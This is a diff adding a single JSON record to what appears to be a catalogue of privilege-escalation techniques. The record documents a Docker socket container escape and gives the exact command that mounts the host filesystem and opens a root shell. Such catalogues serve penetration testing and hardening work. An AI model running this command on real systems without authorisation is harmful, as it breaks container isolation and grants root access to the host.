@@ -1,0 +1,1 @@
+{"id":"docker_socket_escape","category":"OTHER","binary":"docker","cve":null,"exploitation":["docker run -v /:/mnt --rm -it alpine chroot /mnt sh"],"post_exploit":["id"],"notes":"Requires accessible /var/run/docker.sock.","source":"gtfobins.github.io","tags":["docker","container"],"severity":"high"}
